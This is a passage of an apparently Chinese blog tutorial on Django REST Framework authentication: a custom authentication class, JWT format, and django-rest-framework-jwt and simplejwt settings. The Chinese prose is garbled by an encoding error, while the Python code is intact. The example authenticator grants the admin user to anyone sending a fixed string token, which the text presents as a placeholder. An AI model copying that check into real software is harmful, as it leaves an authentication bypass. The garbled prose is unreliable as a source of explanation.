request.userã€request.auth</span></span><br><span class="line">            self.user, self.auth = user_auth_tuple</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># å¦‚æœè¿”å›å€¼user_auth_tupleä¸ºç©ºï¼Œä»£è¡¨è®¤è¯é€šè¿‡ï¼Œä½†æ˜¯æ²¡æœ‰ ç™»é™†ç”¨æˆ· ä¸ ç™»é™†è®¤è¯ä¿¡æ¯ï¼Œä»£è¡¨æ¸¸å®¢</span></span><br><span class="line">    self._not_authenticated()</span><br></pre></td></tr></table></figure><h1 id="è‡ªå®šä¹‰è®¤è¯ç±»"><a href="#è‡ªå®šä¹‰è®¤è¯ç±»" class="headerlink" title="è‡ªå®šä¹‰è®¤è¯ç±»"></a>è‡ªå®šä¹‰è®¤è¯ç±»</h1><div class="note warning">            <p>è®¤è¯ç»„ä»¶ä¸€èˆ¬éƒ½æ˜¯è‡ªå®šä¹‰çš„ï¼Œä¸ä¼šä½¿ç”¨åŸå§‹çš„</p>          </div><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>ä»æºç çš„<code>settings</code>æ–‡ä»¶å¯ä»¥çœ‹å‡ºï¼Œè®¤è¯ç±»éœ€è¦ç»§æ‰¿<code>BasicAuthentication</code>(åœ¨authentication.pyæ–‡ä»¶)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_AUTHENTICATION_CLASSES<span class="string">': [</span></span><br><span class="line"><span class="string">    '</span>rest_framework.authentication.SessionAuthentication<span class="string">',  #ä¼šé‡æ–°å¼€å¯CSRFè®¤è¯</span></span><br><span class="line"><span class="string">    '</span>rest_framework.authentication.BasicAuthentication<span class="string">'</span></span><br><span class="line"><span class="string">]</span></span><br></pre></td></tr></table></figure><p>å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>åˆ›å»ºç»§æ‰¿<code>BaseAuthentication</code>çš„è®¤è¯ç±»</li><li>é‡å†™<code>authenticate</code>æ–¹æ³•</li><li>å®ç°ä½“æ ¹æ®è®¤è¯è§„åˆ™ ç¡®å®šæ¸¸å®¢ã€éæ³•ç”¨æˆ·ã€åˆæ³•ç”¨æˆ· ï¼ˆæ ¹æ®è‡ªå·±çš„è®¤è¯è§„åˆ™ï¼‰<ul><li>æ²¡æœ‰è®¤è¯ä¿¡æ¯è¿”å›<code>None</code>(æ¸¸å®¢)</li><li>æœ‰è®¤è¯ä¿¡æ¯è®¤è¯å¤±è´¥æŠ›å¼‚å¸¸(éæ³•ç”¨æˆ·)</li><li>æœ‰è®¤è¯ä¿¡æ¯è®¤è¯æˆåŠŸè¿”å›ç”¨æˆ·ä¸è®¤è¯ä¿¡æ¯å…ƒç»„(åˆæ³•ç”¨æˆ·)</li></ul></li><li>è¿›è¡Œå…¨å±€æˆ–å±€éƒ¨é…ç½®</li></ol><h2 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><h3 id="models-py"><a href="#models-py" class="headerlink" title="models.py"></a>models.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(AbstractUser)</span>:</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>,unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'user'</span></span><br><span class="line">        verbose_name = <span class="string">'ç”¨æˆ·è¡¨'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.username</span><br></pre></td></tr></table></figure><h3 id="utils-authentications-py"><a href="#utils-authentications-py" class="headerlink" title="utils.authentications.py"></a>utils.authentications.py</h3><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1ï¼‰ç»§æ‰¿BaseAuthenticationç±»</span></span><br><span class="line"><span class="comment"># 2ï¼‰é‡å†™authenticate(self, request)æ–¹æ³•ï¼Œè‡ªå®šä¹‰è®¤è¯è§„åˆ™</span></span><br><span class="line"><span class="comment"># 3ï¼‰è‡ªå®šä¹‰è®¤è¯è§„åˆ™åŸºäºçš„æ¡ä»¶ï¼š</span></span><br><span class="line"><span class="comment">#       æ²¡æœ‰è®¤è¯ä¿¡æ¯è¿”å›None(æ¸¸å®¢)</span></span><br><span class="line"><span class="comment">#       æœ‰è®¤è¯ä¿¡æ¯è®¤è¯å¤±è´¥æŠ›å¼‚å¸¸(éæ³•ç”¨æˆ·)</span></span><br><span class="line"><span class="comment">#       æœ‰è®¤è¯ä¿¡æ¯è®¤è¯æˆåŠŸè¿”å›ç”¨æˆ·ä¸è®¤è¯ä¿¡æ¯å…ƒç»„(åˆæ³•ç”¨æˆ·)</span></span><br><span class="line"><span class="comment"># 4ï¼‰å®Œå…¨è§†å›¾ç±»çš„å…¨å±€(settingsæ–‡ä»¶ä¸­)æˆ–å±€éƒ¨(ç¡®åˆ‡çš„è§†å›¾ç±»)é…ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> BaseAuthentication</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> AuthenticationFailed   <span class="comment">#å¼‚å¸¸æ¥æ”¶</span></span><br><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç»§æ‰¿BaseAuthentication</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyAuthentication</span><span class="params">(BaseAuthentication)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        åŒå‰å°è¯·æ±‚å¤´æ‹¿è®¤è¯ä¿¡æ¯authï¼ˆè·å–è®¤è¯çš„å­—æ®µè¦ä¸å‰å°çº¦å®šï¼‰</span></span><br><span class="line"><span class="string">        æ²¡æœ‰authæ˜¯æ¸¸å®¢ï¼Œè¿”å›None</span></span><br><span class="line"><span class="string">        æœ‰authè¿›è¡Œæ ¡éªŒ</span></span><br><span class="line"><span class="string">            å¤±è´¥æ˜¯éæ³•ç”¨æˆ·ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"><span class="string">            æˆåŠŸæ˜¯åˆæ³•ç”¨æˆ·ï¼Œè¿”å› (ç”¨æˆ·, è®¤è¯ä¿¡æ¯)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">authenticate</span><span class="params">(self, request)</span>:</span>   <span class="comment">#é‡å†™authenticateæ–¹æ³•</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="comment">#å‰å°åœ¨è¯·æ±‚å¤´æºå¸¦è®¤è¯ä¿¡æ¯ï¼Œ</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="comment">#ä¸”é»˜è®¤è§„èŒƒç”¨ Authorization å­—æ®µæºå¸¦è®¤è¯ä¿¡æ¯ï¼Œ</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="comment">#åå°å›ºå®šåœ¨è¯·æ±‚å¯¹è±¡çš„METAå­—æ®µä¸­ HTTP_AUTHORIZATION è·å–</span></span><br><span class="line">        <span class="comment">#è®¤è¯ä¿¡æ¯auth</span></span><br><span class="line">        auth = request.META.get(<span class="string">'HTTP_AUTHORIZATION'</span>,<span class="literal">None</span>)<span class="comment">#å¤„ç†æ¸¸å®¢</span></span><br><span class="line">        <span class="keyword">if</span> auth <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#è®¾ç½®è®¤è¯å­—æ®µå°è§„åˆ™(ä¸¤æ®µå¼):"auth è®¤è¯å­—ç¬¦ä¸²" åœ¨BasicAuthenticationç±»ä¸­æœ‰è§„åˆ™èŒƒå¼</span></span><br><span class="line">        auth_list = auth.split()     <span class="comment">#æ ¡éªŒæ˜¯å¦è¿˜æ˜¯éæ³•ç”¨æˆ·,ä¸æ˜¯ä¸¤æ®µï¼Œç¬¬ä¸€æ®µä¸æ˜¯authå°±æ˜¯éæ³•ç”¨æˆ·</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (len(auth_list) == <span class="number">2</span> <span class="keyword">and</span> auth_list[<span class="number">0</span>].lower() == <span class="string">'auth'</span>):</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'è®¤è¯ä¿¡æ¯æœ‰è¯¯ï¼Œéæ³•ç”¨æˆ·'</span>)  <span class="comment">#æŠ›å¼‚å¸¸</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#æ ¡éªŒè®¤è¯ä¿¡æ¯ç¬¬äºŒæ®µä»auth_list[1]ä¸­è§£æå‡ºæ¥</span></span><br><span class="line">        <span class="comment"># æ³¨ï¼šå‡è®¾ä¸€ç§æƒ…å†µï¼Œä¿¡æ¯ä¸ºabc.123.xyzï¼Œå°±å¯ä»¥è§£æå‡ºadminç”¨æˆ·ï¼›å®é™…å¼€å‘ï¼Œè¯¥é€»è¾‘ä¸€å®šæ˜¯æ ¡éªŒç”¨æˆ·çš„æ­£å¸¸é€»è¾‘</span></span><br><span class="line">        <span class="keyword">if</span> auth_list[<span class="number">1</span>] != <span class="string">'abc.123.xyz'</span>: <span class="comment">#æ ¡éªŒå¤±è´¥</span></span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'ä¿¡æ¯é”™è¯¯ï¼Œéæ³•ç”¨æˆ·'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#æœ€åå†å»æ•°æ®åº“æ ¡éªŒæ˜¯å¦æœ‰æ­¤ç”¨æˆ·</span></span><br><span class="line">        user = models.User.objects.filter(username=<span class="string">'admin'</span>).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'ç”¨æˆ·æ•°æ®æœ‰è¯¯ï¼Œéæ³•ç”¨æˆ·'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (user,<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></details><h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><p>åœ¨<code>settings</code>æ–‡ä»¶ä¸­é…ç½®è‡ªå®šä¹‰è®¤è¯ç»„ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># è®¤è¯ç±»é…ç½®</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># å¦‚æœé€šè¿‡äº†è®¤è¯ç»„ä»¶ï¼Œrequest.userå°±ä¸€å®šæœ‰å€¼</span></span><br><span class="line">        <span class="comment"># æ¸¸å®¢ï¼šAnonymousUser</span></span><br><span class="line">        <span class="comment"># ç”¨æˆ·ï¼šUserè¡¨ä¸­çš„å…·ä½“ç”¨æˆ·å¯¹è±¡</span></span><br><span class="line">        print(request.user)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'test get ok'</span>)</span><br></pre></td></tr></table></figure><h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'test/'</span>, views.TestAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="Postmanæµ‹è¯•"><a href="#Postmanæµ‹è¯•" class="headerlink" title="Postmanæµ‹è¯•"></a>Postmanæµ‹è¯•</h2><p>ä½¿ç”¨Postmançš„getè¯·æ±‚ï¼Œåœ¨è‡ªå®šä¹‰è®¤è¯ç»„ä»¶è·å–ç”¨æˆ·ï¼Œåœ¨viewsè§†å›¾é€šè¿‡<code>request.user</code>èƒ½æ‰“å°å‡ºæ¥</p><h1 id="Tokenè®¤è¯"><a href="#Tokenè®¤è¯" class="headerlink" title="Tokenè®¤è¯"></a>Tokenè®¤è¯</h1><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>RESTful APIé‡Œä½¿ç”¨æœ€æ™®éçš„å°±æ˜¯åŸºäºjsonçš„tokenè®¤è¯äº†ï¼Œå³Json Web Tokenï¼ˆJWTï¼‰ã€‚JWT æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519)ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç”¨äºç®€æ´ï¼Œè‡ªåŒ…å«çš„ç”¨äºé€šä¿¡åŒæ–¹ä¹‹é—´ä»¥ JSON å¯¹è±¡çš„å½¢å¼å®‰å…¨ä¼ é€’ä¿¡æ¯çš„æ–¹æ³•ã€‚JWT å¯ä»¥ä½¿ç”¨ HMAC ç®—æ³•æˆ–è€…æ˜¯ RSA çš„å…¬é’¥å¯†é’¥å¯¹è¿›è¡Œç­¾åã€‚</p><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><ol><li>æœåŠ¡å™¨ä¸è¦å­˜å‚¨tokenï¼Œtokenäº¤ç»™æ¯ä¸€ä¸ªå®¢æˆ·ç«¯è‡ªå·±å­˜å‚¨ï¼ŒæœåŠ¡å™¨å‹åŠ›å°</li><li>æœåŠ¡å™¨å­˜å‚¨çš„æ˜¯ ç­¾å‘å’Œæ ¡éªŒtoken ä¸¤æ®µç®—æ³•ï¼Œç­¾å‘è®¤è¯çš„æ•ˆç‡é«˜</li><li>ç®—æ³•å®Œæˆå„é›†ç¾¤æœåŠ¡å™¨åŒæ­¥æˆæœ¬ä½ï¼Œè·¯ç”±é¡¹ç›®å®Œæˆé›†ç¾¤éƒ¨ç½²ï¼ˆé€‚åº”é«˜å¹¶å‘ï¼‰</li></ol><h3 id="JWTæ ¼å¼"><a href="#JWTæ ¼å¼" class="headerlink" title="JWTæ ¼å¼"></a>JWTæ ¼å¼</h3><ol><li>jwt tokené‡‡ç”¨ä¸‰æ®µå¼ï¼šå¤´éƒ¨.è½½è·.ç­¾å</li><li>æ¯ä¸€éƒ¨åˆ†éƒ½æ˜¯ä¸€ä¸ªjsonå­—å…¸åŠ å¯†å½¢å‚çš„å­—ç¬¦ä¸²</li><li>å¤´éƒ¨å’Œè½½è·é‡‡ç”¨çš„æ˜¯base64å¯é€†åŠ å¯†ï¼ˆå‰å°åå°éƒ½å¯ä»¥è§£å¯†ï¼‰</li><li>ç­¾åé‡‡ç”¨hash256ä¸å¯é€†åŠ å¯†ï¼ˆåå°æ ¡éªŒé‡‡ç”¨ç¢°æ’æ ¡éªŒï¼‰</li><li>å„éƒ¨åˆ†å­—å…¸çš„å†…å®¹ï¼š<ul><li>å¤´éƒ¨ï¼šåŸºç¡€ä¿¡æ¯ - å…¬å¸ä¿¡æ¯ã€é¡¹ç›®ç»„ä¿¡æ¯ã€å¯é€†åŠ å¯†é‡‡ç”¨çš„ç®—æ³•</li><li>è½½è·ï¼šæœ‰ç”¨ä½†éç§å¯†çš„ä¿¡æ¯ - ç”¨æˆ·å¯å…¬å¼€ä¿¡æ¯ã€è¿‡æœŸæ—¶é—´</li><li>ç­¾åï¼šå¤´éƒ¨+è½½è·+ç§˜é’¥ ä¸å¯é€†åŠ å¯†åçš„ç»“æœ</li><li>æ³¨ï¼šæœåŠ¡å™¨jwtç­¾ååŠ å¯†ç§˜é’¥ä¸€å®šä¸èƒ½æ³„éœ²</li></ul></li></ol><h3 id="ç­¾å‘ä¸æ ¡éªŒ"><a href="#ç­¾å‘ä¸æ ¡éªŒ" class="headerlink" title="ç­¾å‘ä¸æ ¡éªŒ"></a>ç­¾å‘ä¸æ ¡éªŒ</h3><ul><li>ç­¾å‘tokenï¼šå›ºå®šçš„å¤´éƒ¨ä¿¡æ¯åŠ å¯†ã€‚å½“å‰çš„ç™»é™†ç”¨æˆ·ä¸è¿‡æœŸæ—¶é—´åŠ å¯†ã€‚å¤´éƒ¨+è½½è·+ç§˜é’¥ç”Ÿæˆä¸å¯é€†åŠ å¯†</li><li>æ ¡éªŒtokenï¼šå¤´éƒ¨å¯æ ¡éªŒä¹Ÿå¯ä»¥ä¸æ ¡éªŒï¼Œè½½è·æ ¡éªŒå‡ºç”¨æˆ·ä¸è¿‡æœŸæ—¶é—´ï¼Œå¤´éƒ¨+è½½è·+ç§˜é’¥å®Œæˆç¢°æ’æ£€æµ‹æ ¡éªŒtokenæ˜¯å¦è¢«ç¯¡æ”¹</li></ul><h2 id="DRFè‡ªå¸¦çš„JWTè®¤è¯"><a href="#DRFè‡ªå¸¦çš„JWTè®¤è¯" class="headerlink" title="DRFè‡ªå¸¦çš„JWTè®¤è¯"></a>DRFè‡ªå¸¦çš„JWTè®¤è¯</h2><p>DRFçš„æºç é‡Œæ˜¯å®ç°äº†tokenè®¤è¯æ¨¡å—äº†çš„ï¼Œä¸è¿‡å­˜åœ¨<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDIzZjQzZGYyNjVkYTFiY2MxOTY3NDkjaGVhZGluZy03">ä¸€äº›ä¸è¶³<i class="fa fa-external-link-alt"></i></span>ï¼Œå› æ­¤ä¸€èˆ¬ä¸æ¨èä½¿ç”¨ã€‚</p><p>ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯DRFçš„ä¸¤ä¸ªjwtæ’ä»¶ï¼š</p><ul><li><code>jango-rest-framework-jwt</code>: æ›¾ç»å¾ˆå¸¸ç”¨ï¼Œä½†åæ¥ä½œè€…å·²ä¸å†ç»´æŠ¤ï¼Œå› æ­¤ä¹Ÿä¸æ¨èä½¿ç”¨</li><li><code>django-rest-framework-simplejwt</code>: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvYXV0aGVudGljYXRpb24vI2pzb24td2ViLXRva2VuLWF1dGhlbnRpY2F0aW9u">DRFå®˜æ–¹æ–‡æ¡£<i class="fa fa-external-link-alt"></i></span>æ¨èä½¿ç”¨çš„æ’ä»¶</li></ul><h2 id="DRFæ’ä»¶-django-rest-framework-jwt"><a href="#DRFæ’ä»¶-django-rest-framework-jwt" class="headerlink" title="DRFæ’ä»¶ django-rest-framework-jwt"></a>DRFæ’ä»¶ django-rest-framework-jwt</h2><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹</p><h3 id="settings-py-1"><a href="#settings-py-1" class="headerlink" title="settings.py"></a>settings.py</h3><div class="note warning">            <p>æ­¤å¤„è®¾ç½®çš„æ˜¯å…¨å±€é…ç½®</p>          </div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># è®¤è¯ç±»é…ç½®</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">        <span class="string">'rest_framework_jwt.authentication.JSONWebTokenAuthentication'</span>, <span class="comment"># jwtå…¨å±€é…ç½®</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="models-py-1"><a href="#models-py-1" class="headerlink" title="models.py"></a>models.py</h3><p>ä»£ç åŒä¸Š</p><h3 id="views-py-1"><a href="#views-py-1" class="headerlink" title="views.py"></a>views.py</h3><div class="note warning">            <p>æ­¤å¤„è®¾ç½®çš„æ˜¯å±€éƒ¨é…ç½®</p>          </div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"><span class="comment"># å¿…é¡»ç™»å½•åæ‰èƒ½è®¿é—® - é€šè¿‡äº†è®¤è¯æƒé™ç»„ä»¶</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.authentication <span class="keyword">import</span> JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication]  <span class="comment"># å±€éƒ¨é…ç½®jwt-tokenæ ¡éªŒrequest.user</span></span><br><span class="line">    permission_classes = [IsAuthenticated]  <span class="comment"># ç»“åˆæƒé™ç»„ä»¶ç­›é€‰æ‰æ¸¸å®¢</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=&#123;<span class="string">'username'</span>: request.user.username&#125;)</span><br></pre></td></tr></table></figure><h3 id="url-py"><a href="#url-py" class="headerlink" title="url.py"></a>url.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ObtainJSONWebTokenè§†å›¾ç±»å°±æ˜¯é€šè¿‡usernameå’Œpasswordå¾—åˆ°userå¯¹è±¡ç„¶åç­¾å‘tokenï¼ˆç”Ÿæˆtokenï¼‰</span></span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> ObtainJSONWebToken, obtain_jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'jwt/'</span>, obtain_jwt_token),</span><br><span class="line">    path(<span class="string">'user/detail/'</span>, views.UserDetail.as_view()),</span><br></pre></td></tr></table></figure><h2 id="DRFæ’ä»¶-django-rest-framework-simplejwt"><a href="#DRFæ’ä»¶-django-rest-framework-simplejwt" class="headerlink" title="DRFæ’ä»¶ django-rest-framework-simplejwt"></a>DRFæ’ä»¶ django-rest-framework-simplejwt</h2><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹</p><h3 id="settings-py-2"><a href="#settings-py-2" class="headerlink" title="settings.py"></a>settings.py</h3><div class="note warning">            <p>æ­¤å¤„è®¾ç½®çš„æ˜¯å…¨å±€é…ç½®</p>          </div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># è®¤è¯ç±»é…ç½®</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">        <span class="string">'rest_framework_simplejwt.authentication.JWTAuthentication'</span>, <span class="comment"># å…¨å±€é…ç½®</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œè¿˜æœ‰simplejwtçš„ä¸€äº›ç»†èŠ‚é…ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Reference :</span></span><br><span class="line"><span class="comment"># 1. https://django-rest-framework-simplejwt.readthedocs.io/en/latest/settings.html</span></span><br><span class="line"><span class="comment"># 2. https://juejin.im/post/5d23f43df265da1bcc196749#heading-15</span></span><br><span class="line">SIMPLE_JWT = &#123;</span><br><span class="line">    <span class="string">'ACCESS_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">    <span class="string">'REFRESH_TOKEN_LIFETIME'</span>: timedelta(days=<span class="number">1</span>),</span><br><span class="line">    <span class="string">'ROTATE_REFRESH_TOKENS'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">'BLACKLIST_AFTER_ROTATION'</span>: <span class="literal">True</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'ALGORITHM'</span>: <span class="string">'HS256'</span>,</span><br><span class="line">    <span class="string">'SIGNING_KEY'</span>: SECRET_KEY,</span><br><span class="line">    <span class="string">'VERIFYING_KEY'</span>: <span class="literal">None</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'AUTH_HEADER_TYPES'</span>: (<span class="string">'Bearer'</span>,),</span><br><span class="line">    <span class="string">'USER_ID_FIELD'</span>: <span class="string">'id'</span>,</span><br><span class="line">    <span class="string">'USER_ID_CLAIM'</span>: <span class="string">'user_id'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'AUTH_TOKEN_CLASSES'</span>: (<span class="string">'rest_framework_simplejwt.tokens.AccessToken'</span>,),</span><br><span class="line">    <span class="string">'TOKEN_TYPE_CLAIM'</span>: <span class="string">'token_type'</span>,</span><br><span class="line"></span><br><span class="line">    <span 